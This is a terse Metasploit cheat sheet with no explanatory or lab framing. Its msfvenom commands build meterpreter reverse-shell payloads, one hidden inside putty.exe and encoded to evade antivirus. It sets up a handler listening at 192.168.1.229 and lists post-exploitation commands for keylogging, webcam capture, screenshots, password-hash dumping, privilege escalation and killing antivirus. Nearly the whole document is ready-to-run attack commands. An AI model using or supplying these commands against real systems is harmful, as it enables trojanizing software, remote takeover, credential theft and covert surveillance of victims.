# Metasploit Commands

## msfvenom
### x86

    msfvenom -a x86 --platform Windows -p windows/meterpreter_reverse_tcp lhost=192.168.1.229 -k -f exe -x putty.exe -e x86/shikata_ga_nai -i 10 -o putty2.exe

### x64

    msfvenom -a x64 --platform windows -p windows/x64/meterpreter_reverse_tcp lhost=192.168.1.229 -f exe -o putty.exe

## msfconsole

    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    show options
    set LHOST 192.168.1.229
    run

## meterpreter

    sysinfo
    ls,cd,pwd,ps,rm,download,upload,
    getuid
    getsid
    netstat
    ifconfig,ipconfig
    shell
    keyscan_start
    keyscan_dump
    keyscan_stop
    webcam_list
    webcam_stream 1
    webcam_snap
    screenshot
    hashdump
    getprivs
    getsystem
    hashdump
    run killav

